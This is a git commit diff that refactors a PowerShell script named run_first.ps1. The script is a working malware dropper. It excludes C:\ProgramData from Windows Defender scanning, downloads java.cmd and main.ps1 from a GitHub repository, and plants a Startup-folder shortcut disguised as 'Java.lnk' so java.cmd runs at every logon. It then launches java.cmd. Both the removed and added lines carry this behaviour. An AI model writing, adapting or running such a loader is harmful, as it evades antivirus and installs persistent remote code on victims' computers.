d1013e63dc8c3d2e9981e2d9f2886284feb32494
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2023-02-28 13:53:53 +0600

    Update run_first.ps1

--- run_first.ps1
+++ run_first.ps1
@@ -1,19 +1,15 @@
 Set-MpPreference -ExclusionPath C:\ProgramData
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$down = New-Object System.Net.WebClient
-$url = 'https://github.com/qwertyuiopindia/log/raw/main/java.cmd?raw=true'
-$file = "C:\ProgramData\java.cmd"
-$down.DownloadFile($url,$file)
-$objShell = New-Object -ComObject ("WScript.Shell")
-$objShortCut = $objShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" + "\Java.lnk")
-$objShortCut.TargetPath="C:\ProgramData\java.cmd"
-$objShortCut.Save()
-$down = New-Object System.Net.WebClient
+$webClient = New-Object System.Net.WebClient
+$url1 = 'https://github.com/qwertyuiopindia/log/raw/main/java.cmd?raw=true'
+$file1 = "C:\ProgramData\java.cmd"
 $url2 = 'https://github.com/qwertyuiopindia/log/raw/main/main.ps1?raw=true'
 $file2 = "C:\ProgramData\main.ps1"
-$down.DownloadFile($url2,$file2)
-$file = "C:\ProgramData\java.cmd"
-$exec = New-Object -com shell.application
-$exec.shellexecute($file)
+$webClient.DownloadFile($url1, $file1)
+$webClient.DownloadFile($url2, $file2)
+$objShell = New-Object -ComObject ("WScript.Shell")
+$objShortCut = $objShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" + "\Java.lnk")
+$objShortCut.TargetPath = "C:\ProgramData\java.cmd"
+$objShortCut.Save()
+Start-Process $file1
 exit
-
